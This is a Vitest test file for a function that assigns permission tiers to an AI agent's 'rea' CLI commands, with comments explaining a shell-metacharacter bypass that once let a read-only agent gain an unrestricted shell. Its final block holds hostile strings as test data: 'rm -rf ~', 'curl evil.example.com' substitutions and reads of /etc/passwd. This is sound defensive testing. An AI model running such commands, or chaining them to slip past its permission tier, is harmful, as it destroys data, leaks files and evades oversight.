/**
 * Tests for `reaCommandTier()` — tier classification of `rea <sub>` Bash
 * invocations (Defect E / rea#78).
 *
 * Context: before this helper, ANY Bash-wrapped invocation of rea's own CLI
 * was classified Write (the generic Bash default), which meant an L1 agent
 * could not run `rea cache check` — not to mention the commands the push-gate
 * remediation literally tells the agent to run (`rea cache set <sha> pass
 * ...` and `rea audit record codex-review ...`). The helper fixes the
 * self-consistency break by classifying each subcommand by its own semantics.
 *
 * Trust model (post-Codex pass 3 review):
 *   - FULL trust: first token is absolute AND either (a) ends with
 *     `/node_modules/.bin/rea`, or (b) starts with `/usr/` or `/opt/` AND
 *     ends with `/bin/rea`. Relative paths (`./node_modules/.bin/rea`,
 *     `./bin/rea`), paths in `/home/`, paths in `/tmp/`, and paths that
 *     only coincidentally end in `/bin/rea` or `/dist/cli/index.js` are
 *     NOT trusted (pass-3 Codex Finding 1).
 *   - WEAK trust: bare `rea`, `npx rea …`, and `npx @bookedsolid/rea …`.
 *     `npx` is weak because a first-run download+execute is not Read-tier
 *     semantics (pass-3 Codex Finding 2). Returns `Destructive` for
 *     `freeze` so `rea freeze` at L1 still blocks regardless of invocation
 *     shape; returns `null` otherwise (no downgrade — defers to the
 *     generic Bash Write default).
 *   - No trust: returns `null` for any non-rea first token.
 */

import { describe, expect, it } from 'vitest';
import { reaCommandTier } from '../../src/config/tier-map.js';
import { Tier } from '../../src/policy/types.js';

describe('reaCommandTier — fully-trusted invocations (absolute path only)', () => {
  it.each([
    ['/usr/local/bin/rea check', Tier.Read],
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['/usr/local/bin/rea status', Tier.Read],
    ['/usr/bin/rea check', Tier.Read],
    ['/opt/homebrew/bin/rea doctor', Tier.Read],
    ['/opt/app/node_modules/.bin/rea cache get abc', Tier.Read],
    ['/Users/me/project/node_modules/.bin/rea cache check abc --branch feat/x --base main', Tier.Read],
    ['/usr/local/bin/rea audit verify', Tier.Read],
    ['/usr/local/bin/rea audit record codex-review --head-sha abc --verdict pass', Tier.Read],
  ])('%s → Read', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea cache set abc pass --branch feat/x --base main', Tier.Write],
    ['/opt/app/node_modules/.bin/rea cache clear abc', Tier.Write],
    ['/usr/local/bin/rea audit rotate', Tier.Write],
    ['/usr/local/bin/rea init --yes', Tier.Write],
    ['/usr/local/bin/rea serve', Tier.Write],
    ['/usr/local/bin/rea upgrade --yes', Tier.Write],
    ['/usr/local/bin/rea unfreeze --yes', Tier.Write],
    ['/usr/local/bin/rea something-unrecognized', Tier.Write],
  ])('%s → Write', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea freeze --reason halt', Tier.Destructive],
    ['/opt/app/node_modules/.bin/rea freeze --reason halt', Tier.Destructive],
  ])('%s → Destructive', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it('bare /usr/.../rea (no subcommand) treats as Read — equivalent to --help', () => {
    expect(reaCommandTier('/usr/local/bin/rea')).toBe(Tier.Read);
  });

  it('tolerates leading/trailing whitespace', () => {
    expect(reaCommandTier('   /usr/local/bin/rea check   ')).toBe(Tier.Read);
  });
});

describe('reaCommandTier — weak trust (bare `rea`, `npx rea`, relative paths)', () => {
  // Weak-trust: no Read downgrade. These would be Read under full trust but
  // weak-trust invocations defer to the generic Bash Write default (null).
  it.each([
    // Bare name — PATH-spoofable.
    'rea check',
    'rea doctor',
    'rea status',
    'rea cache check abc',
    'rea audit verify',
    'rea audit record codex-review --head-sha abc --verdict pass',
    'rea',
    // npx — pass-3 Codex Finding 2. npx on a cache-cold machine
    // downloads + writes + executes, which is not Read-tier.
    'npx rea check',
    'npx rea doctor',
    'npx rea cache check abc --branch a --base main',
    'npx @bookedsolid/rea doctor',
    // Relative paths — attacker-influenced via CWD.
    './node_modules/.bin/rea check',
    './node_modules/.bin/rea cache check abc',
    './node_modules/.bin/rea doctor',
    // /home/ paths — writable without root, not honored.
    '/home/user/.npm-global/bin/rea check',
    '/home/user/.local/bin/rea doctor',
  ])('%s → null (defers to generic Bash Write)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  // Weak-trust: Write subcommands still return null — same generic default.
  it.each([
    'rea cache set abc pass',
    'rea init --yes',
    'rea upgrade --yes',
    'npx rea init --yes',
    './node_modules/.bin/rea cache set abc pass',
  ])('%s → null (write fall-through)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  // Weak-trust: Destructive upgrade IS preserved. `rea freeze` at L1 must
  // block regardless of whether the binary on PATH is ours.
  it.each([
    'rea freeze --reason "stop"',
    'npx rea freeze --reason halt',
    'npx @bookedsolid/rea freeze --reason halt',
    './node_modules/.bin/rea freeze --reason halt',
    '/home/user/.npm-global/bin/rea freeze',
  ])('%s → Destructive (upgrade preserved even under weak trust)', (cmd) => {
    expect(reaCommandTier(cmd)).toBe(Tier.Destructive);
  });
});

describe('reaCommandTier — non-rea commands', () => {
  it.each([
    'ls -la',
    'git push',
    'node scripts/build.js',
    'npm install',
    'npx prettier --check .',
    'pnpm test',
    'rearrange-files',
    'area-test',
  ])('returns null for %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it('returns null for empty or whitespace-only input', () => {
    expect(reaCommandTier('')).toBeNull();
    expect(reaCommandTier('   ')).toBeNull();
  });

  it('returns null for npx without rea', () => {
    expect(reaCommandTier('npx prettier')).toBeNull();
    expect(reaCommandTier('npx')).toBeNull();
  });
});

/**
 * Codex HIGH regression — shell-metachar tier bypass.
 *
 * Before the fix, `reaCommandTier()` looked at tokens[0] after splitting on
 * whitespace. A command like `rea check && rm -rf ~` had tokens[0]='rea'
 * and tokens[1]='check', so the helper returned Read — downgrading the
 * entire Bash invocation (including the `&& rm -rf ~` payload) from the
 * generic Write tier. At L0 that would convert a read-only agent into an
 * effectively-unrestricted shell.
 *
 * The fix: refuse to classify any command that contains shell metacharacters
 * that would let the attacker chain commands, pipe data out, substitute,
 * or background. Null forces the generic Bash Write default.
 */
describe('reaCommandTier — shell-metacharacter bypass (Codex HIGH)', () => {
  it.each([
    // Chain operators
    '/usr/local/bin/rea check && touch /tmp/pwned',
    '/usr/local/bin/rea check || rm -rf ~',
    '/usr/local/bin/rea check ; rm -rf ~',
    // Pipe
    '/usr/local/bin/rea cache check abc | cat',
    // Background
    '/usr/local/bin/rea check & curl evil.example.com',
    // Command substitution
    '/usr/local/bin/rea check $(curl evil.example.com)',
    '/usr/local/bin/rea check `curl evil.example.com`',
    // Process substitution
    '/usr/local/bin/rea check >(tee /tmp/leak)',
    '/usr/local/bin/rea check <(cat /etc/passwd)',
    // Embedded newline
    '/usr/local/bin/rea check\ntouch /tmp/pwned',
    '/usr/local/bin/rea check\rcarriage-return',
    // Plain redirection (Codex HIGH 2 carry-over — redirection operators
    // write arbitrary data the classifier cannot model)
    '/usr/local/bin/rea check > /etc/passwd',
    '/usr/local/bin/rea check < /etc/passwd',
    '/usr/local/bin/rea check >> /tmp/out',
    '/usr/local/bin/rea doctor << EOF',
  ])('returns null for "%s"', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    // Bare name — PATH-spoofable. Weak-trust; Read downgrade denied.
    'rea check',
    'rea doctor',
    // Relative paths — not absolute, so never full-trust.
    './evil-rea freeze',
    './rea check',
    './bin/rea check',
    './dist/cli/index.js doctor',
    // Absolute paths not matching any trusted install marker.
    '/opt/evil-rea check',
    '/tmp/not-the-real-rea doctor',
    // Pass-3 Codex Finding 1: these previously classified as trusted via
    // suffix match. They are now rejected because (a) relative, or (b) in
    // an attacker-writable absolute path.
    '/tmp/repo/bin/rea doctor',
    '/tmp/repo/dist/cli/index.js check',
    '/home/user/repo/bin/rea check',
  ])('returns null for weak/untrusted path-based "rea" invocations: %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['/usr/bin/rea check', Tier.Read],
    ['/opt/app/node_modules/.bin/rea audit record codex-review', Tier.Read],
  ])('keeps classification for trusted paths: %s', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});
